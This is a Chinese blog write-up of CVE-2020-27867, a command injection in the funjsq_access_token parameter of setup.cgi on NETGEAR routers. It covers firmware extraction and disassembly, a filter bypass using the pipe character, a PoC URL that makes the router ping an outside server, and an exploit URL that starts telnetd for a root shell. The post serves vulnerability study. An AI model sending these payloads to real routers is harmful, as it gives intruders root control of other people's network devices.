<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="keywords" content="" />
  <meta name="author" content="arttnba3" />
  <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ" />
  
  
  <title>
    
      【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析 
      
      
      |
    
     arttnba3&#39;s blog
  </title>

  
    <link rel="apple-touch-icon" href="/img/favicon.png">
    <link rel="icon" href="/img/favicon.png">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  
<link rel="stylesheet" href="/css/color-scheme.css">
<link rel="stylesheet" href="/css/base.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
<link rel="stylesheet" href="/css/github-markdown.css">
<link rel="stylesheet" href="/css/highlight.css">
<link rel="stylesheet" href="/css/comments.css">

  <!-- 代码块风格 -->
  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 6.2.0"><link rel="alternate" href="/atom.xml" title="arttnba3's blog" type="application/atom+xml">
</head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a target="_blank" rel="noopener" href="https://arttnba3.cn">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/img/avatar.png" alt="">
      
    </a>
    <div class="nickname"><a target="_blank" rel="noopener" href="https://arttnba3.cn">arttnba3's blog</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/categories/">
          <a href="/categories/">Categories</a>
        </li>
      
        <li class="nav-item" data-path="/tags/">
          <a href="/tags/">Tags</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
        <li class="nav-item" data-path="/about/">
          <a href="/about/">About</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">【CVE.0x04】CVE-2020-27867 NETGEAR 路由器 RCE 漏洞复现及简要分析</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime" title="更新时间"></i>
          2021-08-17 11:50:50
        </span>
        
              <span class="post-categories">
                <i class="iconfont icon-bookmark" title="分类"></i>
                
                <span class="span--category">
                  <a href="/categories/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
              </span>
          
              <span class="post-tags">
                <i class="iconfont icon-tags" title="标签"></i>
                
                <span class="span--tag">
                  <a href="/tags/Pwn/" title="Pwn">
                    <b>#</b> Pwn
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/CVE/" title="CVE">
                    <b>#</b> CVE
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Linux/" title="Linux">
                    <b>#</b> Linux
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Netgear/" title="Netgear">
                    <b>#</b> Netgear
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Remote-Code-Execute/" title="Remote Code Execute">
                    <b>#</b> Remote Code Execute
                  </a>
                </span>
                
                <span class="span--tag">
                  <a href="/tags/Command-Injection/" title="Command Injection">
                    <b>#</b> Command Injection
                  </a>
                </span>
                
              </span>
          
      </div>
      <div class="markdown-body">
        <p><del>MIPS 大法好</del></p>
<span id="more"></span>

<p>MIPS 太憨憨了，还是 X86 好（恼）</p>
<h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote>
<p>以下都是废话233333</p>
</blockquote>
<p><strong>美国网件公司</strong>（<strong>NETGEAR</strong>）是一家专门做网络设备的公司。在2020年末其旗下多款路由器产品被爆出存在远程代码执行漏洞——mini_httpd 服务中对其提供的<strong>帆游加速器</strong>功能的参数解析存在缺陷从而导致可以进行命令注入，从而在远程主机执行任意代码——虽然此种利用需要身份验证，但据悉现有的身份验证机制并不难绕过</p>
<p>在 <a target="_blank" rel="noopener" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-27867">cve.mitre.org</a> 上对该漏洞说明如下：</p>
<blockquote>
<p> This vulnerability allows network-adjacent attackers to execute arbitrary code on affected installations of NETGEAR R6020, R6080, R6120, R6220, R6260, R6700v2, R6800, R6900v2, R7450, JNR3210, WNR2020, Nighthawk AC2100, and Nighthawk AC2400 routers. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed. The specific flaw exists within the mini_httpd service, which listens on TCP port 80 by default. When parsing the funjsq_access_token parameter, the process does not properly validate a user-supplied string before using it to execute a system call. An attacker can leverage this vulnerability to execute code in the context of root. Was ZDI-CAN-11653.</p>
</blockquote>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>参见<a target="_blank" rel="noopener" href="https://kb.netgear.com/000062641/Security-Advisory-for-Password-Recovery-Vulnerabilities-on-Some-Routers">官网</a></p>
<h2 id="复现环境搭建"><a href="#复现环境搭建" class="headerlink" title="复现环境搭建"></a>复现环境搭建</h2><p>笔者本人比较穷，买不起网件的路由器（哭哭），但最终还是有幸从朋友那借来了一台 R6800 机器，得以对该漏洞进行复现</p>
<p><img src="https://i.loli.net/2021/08/20/8hxInwiBy1zQHjb.png" alt="image.png"></p>
<blockquote>
<p>前面这几百字讲了一堆废话倒是真的hhhh</p>
</blockquote>
<h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01.漏洞分析"></a>0x01.漏洞分析</h1><h2 id="文件提取"><a href="#文件提取" class="headerlink" title="文件提取"></a>文件提取</h2><p>首先在<a target="_blank" rel="noopener" href="https://www.netgear.com/support/product/R6800.aspx#Firmware%20Version%201.2.0.74">官网</a>下载对应版本（1.2.0.74）的固件，解压后得到一个 img 镜像文件</p>
<p>使用 binwalk 提取其中的内容：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">binwalk -e</span> </span><br></pre></td></tr></table></figure>

<p>得到两个文件 <code>200.zip </code> 和 <code>R6950.bin</code>，其中前者为后者的压缩包，继续使用 binwalk 解压后者，得到的 <code>squashfs-root</code> 文件夹便是该设备的文件系统</p>
<p>在文件系统中有着大量的软链接，大部分最终都是指向 <code>usr/sbin</code> 目录，相应地 <code>init</code> 进程指向的是 <code>usr/sbin/busybox</code></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ll</span></span><br><span class="line">total 84</span><br><span class="line">drwxr-xr-x 12 arttnba3 arttnba3  4096 Aug 18 20:14 ./</span><br><span class="line">drwxrwxr-x  3 arttnba3 arttnba3  4096 Aug 18 20:56 ../</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 bin -&gt; usr/sbin//</span><br><span class="line">drwxrwxr-x  2 arttnba3 arttnba3  4096 Aug 15  2015 data/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Oct 18  2015 dev/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 etc -&gt; /tmp/etc</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 etc_ro -&gt; /tmp/etc_ro</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3    20 Aug 17  2020 home -&gt; /tmp/home_directory/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3    11 Aug 17  2020 init -&gt; bin/busybox*</span><br><span class="line">drwxr-xr-x  6 arttnba3 arttnba3 12288 Aug 17  2020 lib/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Dec  2  2012 media/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 mnt -&gt; /tmp/mnt</span><br><span class="line">drwxrwxr-x  6 arttnba3 arttnba3  4096 Aug 17  2020 opt/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 12  2000 proc/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     9 Aug 17  2020 sbin -&gt; usr/sbin//</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Nov 16  2008 sys/</span><br><span class="line">drwxr-xr-x  2 arttnba3 arttnba3  4096 Jul 28  2000 tmp/</span><br><span class="line">drwxr-xr-x 11 arttnba3 arttnba3  4096 Aug 18 18:59 usr/</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 var -&gt; /tmp/var</span><br><span class="line">lrwxrwxrwx  1 arttnba3 arttnba3     8 Aug 17  2020 www -&gt; /tmp/www</span><br><span class="line">drwxrwxr-x  8 arttnba3 arttnba3 32768 Aug 17  2020 www.eng/</span><br></pre></td></tr></table></figure>

<p>在 <code>usr</code> 目录下还有一个文件 <code>funjsq_plugin_netgear_r6800.tar.gz</code>，解压：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">tar -zxvf funjsq_plugin_netgear_r6800.tar.gz</span></span><br><span class="line">./tmp/</span><br><span class="line">./tmp/funjsq/</span><br><span class="line">./tmp/funjsq/bin/</span><br><span class="line">./tmp/funjsq/bin/funjsq_cli</span><br><span class="line">./tmp/funjsq/bin/funjsq_ctl</span><br><span class="line">./tmp/funjsq/bin/funjsq_nslookup</span><br><span class="line">./tmp/funjsq/bin/funjsq_conntime</span><br><span class="line">./tmp/funjsq/bin/funjsq_daemon</span><br><span class="line">./tmp/funjsq/bin/funjsq_detect</span><br><span class="line">./tmp/funjsq/bin/funjsq_dns</span><br><span class="line">./tmp/funjsq/bin/funjsq_httpd</span><br><span class="line">./tmp/funjsq/bin/funjsq_inetd</span><br><span class="line">./tmp/funjsq/bin/funjsq_redis</span><br><span class="line">./tmp/funjsq/bin/funjsq.sh</span><br><span class="line">./tmp/funjsq/config/</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/funjsq101.conf</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/blocklistDL.conf</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/blocklistGW.conf</span><br><span class="line">./tmp/funjsq/config/dnsmasq.d/funjsq100.conf</span><br><span class="line">./tmp/funjsq/config/values/</span><br><span class="line">./tmp/funjsq/config/funjsqdetect.dat</span><br><span class="line">./tmp/funjsq/config/funjsqMSG.json</span><br><span class="line">./tmp/funjsq/config/funjsq_ca</span><br><span class="line">./tmp/funjsq/config/httpd/</span><br><span class="line">./tmp/funjsq/config/httpd/key.pem</span><br><span class="line">./tmp/funjsq/config/httpd/cert.pem</span><br></pre></td></tr></table></figure>

<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>在漏洞通告中说到该漏洞存在于 <code>mini_httpd</code> 服务中</p>
<p><img src="https://i.loli.net/2021/08/20/SXIgiqxByhKYQMr.png" alt="img.png"></p>
<p>用 <code>burp suite</code>简单测试一下我们可以发现大部分 http 请求都是通过 <code>setup.cgi</code> 来进行的，该文件存在于 <code>/usr/sbin/</code> 目录下</p>
<p><img src="https://i.loli.net/2021/08/20/XdMjNzGWLQU19HY.png" alt="image.png"></p>
<p>拖入 IDA进行分析，查找 <code>funjsq_access_token</code> 字符串</p>
<p><img src="https://i.loli.net/2021/08/23/SKiMvXBaIEN4Wmc.png" alt="image.png"></p>
<p>XREF 到 <code>sub_407C80()</code> 函数，其中会通过 <code>find_val()</code> 函数提取出 <code>funjsq_access_token</code> 参数，进行命令拼接后通过 <code>COMMAND()</code>（本质上其实就是 sh）执行，我们不难想到的是<strong>若是能够插入诸如 &quot;;&quot; 或者 &quot;&amp;&amp;&quot; 这样的分隔符等，便能够执行我们想要执行的命令，即存在一个命令注入的 RCE 漏洞</strong></p>
<p><img src="https://i.loli.net/2021/08/20/m5fCVtKqwzlQBsj.png" alt="image.png"></p>
<p>调用回溯，发现一张如下结构的函数表，我们的 <code>sub_407C80()</code> 刚好对应 <code>funjsq_login</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">typedef</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * func_name;</span><br><span class="line">    <span class="type">void</span> (*func_ptr)();</span><br><span class="line">&#125;StrFunc;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/08/20/uWcTf9iBQneAkaL.png" alt="image.png"></p>
<p>我们可以发现在 <code>CallActionByName()</code> 函数中会根据传入的字符串通过函数表调用对应的函数</p>
<p><img src="https://i.loli.net/2021/08/20/Gbphgm5K9OJCM2R.png" alt="image.png"></p>
<p>最后回溯到 main 函数，我们可以发现对于传入的 todo 参数而言其会调用 <code>CallActionByName()</code> 函数进行解析</p>
<p><img src="https://i.loli.net/2021/08/20/dhx4v6E2DR9PLaf.png" alt="image.png"></p>
<p>在 main 函数中执行到该段代码之前还有一系列的检查，不过<strong>主要针对 POST 请求</strong>，故我们可以直接走 GET 请求来避免一系列的检查</p>
<p>最终我们可以知道通过如下 payload 便能够跳转到出现问题的 <code>sub_407C80()</code> 函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=</span><br></pre></td></tr></table></figure>

<blockquote>
<p>在 <code>find_val()</code> 中还会对命令注入进行过滤，不过功能较弱<img src="https://i.loli.net/2021/08/20/L9VZUiDAlJcme1v.png" alt="image.png"></p>
</blockquote>
<h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p><strong>该漏洞仅验证用户（可以登入路由器页面）可以使用</strong>，常规情况下则还需要想方法绕过用户验证</p>
<blockquote>
<p>刚开始学web，这个真不会…先把二进制的部分（本漏洞）整好先…</p>
</blockquote>
<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>在 mini_httpd 服务中似乎<strong>有着一定的过滤的机制</strong>，诸如 <code>;</code>、<code>&amp;&amp;</code>、<code>||</code>等都会被过滤掉，直接返回 403</p>
<p><img src="https://i.loli.net/2021/08/20/XFigLkICoSzARhW.png" alt="image.png"></p>
<p>最终笔者使用<code>|</code><strong>成功绕过</strong>，笔者在这里选择执行 <code>ping</code> 指令简单看一下效果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|ping%20-c5%20sec.arttnba3.cn</span><br></pre></td></tr></table></figure>

<p>若是成功进入执行命令的流程则应当有如下回显，见到这个回显说明代码成功执行到了该处</p>
<p><img src="https://i.loli.net/2021/08/20/2pYtRXjylSdGo1B.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/20/AfZ6pSCdoBI1qUe.png" alt="image.png"></p>
<p>笔者使用 <code>tcpdump -i eth0 icmp</code> 命令在服务器上查看发现果然成功收到了来自该路由器的 ping 包，命令执行成功</p>
<p><img src="https://i.loli.net/2021/08/20/qKhQGyHNmUOSkIP.png" alt="image.png"></p>
<blockquote>
<p>需要注意的是 <code>COMMAND()</code> 执行命令时会等待其返回才会执行下一条命令，故若是需要同时执行多个命令应当使用 <code>&amp;</code>（url编码<code>%26</code>）将一些长期执行的命令转入后台执行，否则其会一直等待当前命令执行完毕后才会执行下一条命令</p>
<blockquote>
<p>刚拿到命令执行时我执行了 <code>ping my_server_address</code>，没有限制次数，导致后续命令都卡在了 ping 后边没法执行，最后我和学长在公司看了四分之一个下午才发现这个玄学问题的成因…</p>
</blockquote>
</blockquote>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>这台机子自带 <code>telnet</code>，直接通过 telnet 连接上去即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.1/setup.cgi?todo=funjsq_login&amp;next_file=basic_wait.htm&amp;funjsq_access_token=|utelnetd%26</span><br></pre></td></tr></table></figure>

<p>运行，成功通过 telnet 连接获取到一个 shell</p>
<p><img src="https://i.loli.net/2021/08/20/T6Su8JLI9fOadA5.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/20/RYA3cqHGdZstXiC.png" alt="image.png"></p>
<h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF.What’s more…"></a>0xFF.What’s more…</h1><p>在后续官方给出的新版本固件中虽然修复了该漏洞，<strong>但是没有完全修复，使得其成为了简中特供漏洞</strong></p>
<blockquote>
<p>下图来自微博 <code>@blackorbird</code> </p>
<blockquote>
<p>是你🦄 @BlackBird</p>
</blockquote>
</blockquote>
<p><img src="https://i.loli.net/2021/08/20/SxIkKvolHE6Od1B.jpg" alt="img.JPG"></p>
<blockquote>
<p>漏洞细节暂时不能讲，感兴趣的也不推荐私信我hhhhhh</p>
</blockquote>

      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2021/08/10/CVE-0X03-CVE-2016-6909/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2021-08-17 11:50:50
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="分类"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="标签"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CVE/" title="CVE">
                        <b>#</b> CVE
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Linux/" title="Linux">
                        <b>#</b> Linux
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Netgear/" title="Netgear">
                        <b>#</b> Netgear
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Remote-Code-Execute/" title="Remote Code Execute">
                        <b>#</b> Remote Code Execute
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Command-Injection/" title="Command Injection">
                        <b>#</b> Command Injection
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E4%B8%80%E5%88%87%E5%BC%80%E5%A7%8B%E4%B9%8B%E5%89%8D"><span class="toc-text">0x00.一切开始之前</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-text">复现环境搭建</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x01.漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-text">文件提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-text">程序分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">0x02.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#poc"><span class="toc-text">poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0xFF-What%E2%80%99s-more%E2%80%A6"><span class="toc-text">0xFF.What’s more…</span></a></li></ol>
      
    </div>
  </div>

  
<script src="/js/catalog.js"></script>




    
      <div class="comments-container">
        




  
    <script async type="text/javascript" src="/plugins/valine.min.js" onload="loadValineSuc(this)"></script>
  

  <div id="vcomments"></div>

  <script>
    function loadValineSuc() {
      new Valine({
        el: '#vcomments',
        appId: 'ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz',
        appKey: 'tuvJh3xYxPFcW2JB6K26RKP2',
        placeholder: '说点什么呗...',
        avatar: 'retro',
        lang: 'zh-CN'
      })
    }
  </script>

    <style>
      .comments-container .v .vempty {
        display: none!important;
      }
    </style>




      </div>
    
  </div>


        
<div class="footer">
  <div class="social">
    <ul>
      
        <li>
          <a title="github" target="_blank" rel="noopener" href="https://github.com/arttnba3">
            <i class="iconfont icon-github"></i>
          </a>
        </li>
      
        <li>
          <a title="email" href="mailto:arttnba@gmail.com">
            <i class="iconfont icon-envelope"></i>
          </a>
        </li>
      
        <li>
          <a title="twitter" target="_blank" rel="noopener" href="https://twitter.com/arttnba3">
            <i class="iconfont icon-twitter"></i>
          </a>
        </li>
      
        <li>
          <a title="rss" href="/atom.xml">
            <i class="iconfont icon-rss"></i>
          </a>
        </li>
      
    </ul>
  </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/arttnba3">Copyright © 2022 arttnba3</a>
        
    </div>
  
    
    <div class="footer-more">
      
        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
        
    </div>
  
</div>

      </div>

      <div class="tools-bar">
        <div class="back-to-top tools-bar-item hidden">
  <a href="javascript: void(0)">
    <i class="iconfont icon-chevronup"></i>
  </a>
</div>


<script src="/js/backtotop.js"></script>



        
  <div class="search-icon tools-bar-item" id="search-icon">
    <a href="javascript: void(0)">
      <i class="iconfont icon-search"></i>
    </a>
  </div>

  <div class="search-overlay hidden">
    <div class="search-content" tabindex="0">
      <div class="search-title">
        <span class="search-icon-input">
          <a href="javascript: void(0)">
            <i class="iconfont icon-search"></i>
          </a>
        </span>
        
          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
        
        <span class="search-close-icon" id="search-close-icon">
          <a href="javascript: void(0)">
            <i class="iconfont icon-close"></i>
          </a>
        </span>
      </div>
      <div class="search-result" id="search-result"></div>
    </div>
  </div>

  <script type="text/javascript">
    var inputArea = document.querySelector("#search-input")
    var searchOverlayArea = document.querySelector(".search-overlay")

    inputArea.onclick = function() {
      getSearchFile()
      this.onclick = null
    }

    inputArea.onkeydown = function() {
      if(event.keyCode == 13)
        return false
    }

    function openOrHideSearchContent() {
      let isHidden = searchOverlayArea.classList.contains('hidden')
      if (isHidden) {
        searchOverlayArea.classList.remove('hidden')
        document.body.classList.add('hidden')
        // inputArea.focus()
      } else {
        searchOverlayArea.classList.add('hidden')
        document.body.classList.remove('hidden')
      }
    }

    function blurSearchContent(e) {
      if (e.target === searchOverlayArea) {
        openOrHideSearchContent()
      }
    }

    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
    searchOverlayArea.addEventListener("click", blurSearchContent, false)

    var searchFunc = function (path, search_id, content_id) {
      'use strict';
      var $input = document.getElementById(search_id);
      var $resultContent = document.getElementById(content_id);
      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
      $.ajax({
        // 0x01. load xml file
        url: path,
        dataType: "xml",
        success: function (xmlResponse) {
          // 0x02. parse xml file
          var datas = $("entry", xmlResponse).map(function () {
            return {
              title: $("title", this).text(),
              content: $("content", this).text(),
              url: $("url", this).text()
            };
          }).get();
          $resultContent.innerHTML = "";

          $input.addEventListener('input', function () {
            // 0x03. parse query to keywords list
            var str = '<ul class=\"search-result-list\">';
            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
            $resultContent.innerHTML = "";
            if (this.value.trim().length <= 0) {
              return;
            }
            // 0x04. perform local searching
            datas.forEach(function (data) {
              var isMatch = true;
              var content_index = [];
              if (!data.title || data.title.trim() === '') {
                data.title = "Untitled";
              }
              var orig_data_title = data.title.trim();
              var data_title = orig_data_title.toLowerCase();
              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
              var data_content = orig_data_content.toLowerCase();
              var data_url = data.url;
              var index_title = -1;
              var index_content = -1;
              var first_occur = -1;
              // only match artiles with not empty contents
              if (data_content !== '') {
                keywords.forEach(function (keyword, i) {
                  index_title = data_title.indexOf(keyword);
                  index_content = data_content.indexOf(keyword);

                  if (index_title < 0 && index_content < 0) {
                    isMatch = false;
                  } else {
                    if (index_content < 0) {
                      index_content = 0;
                    }
                    if (i == 0) {
                      first_occur = index_content;
                    }
                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
                  }
                });
              } else {
                isMatch = false;
              }
              // 0x05. show search results
              if (isMatch) {
                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
                var content = orig_data_content;
                if (first_occur >= 0) {
                  // cut out 100 characters
                  var start = first_occur - 20;
                  var end = first_occur + 80;

                  if (start < 0) {
                    start = 0;
                  }

                  if (start == 0) {
                    end = 100;
                  }

                  if (end > content.length) {
                    end = content.length;
                  }

                  var match_content = content.substr(start, end);

                  // highlight all keywords
                  keywords.forEach(function (keyword) {
                    var regS = new RegExp(keyword, "gi");
                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
                  });

                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
                }
                str += "</li>";
              }
            });
            str += "</ul>";
            if (str.indexOf('<li>') === -1) {
              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
            }
            $resultContent.innerHTML = str;
          });
        },
        error: function(xhr, status, error) {
          $resultContent.innerHTML = ""
          if (xhr.status === 404) {
            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
          } else {
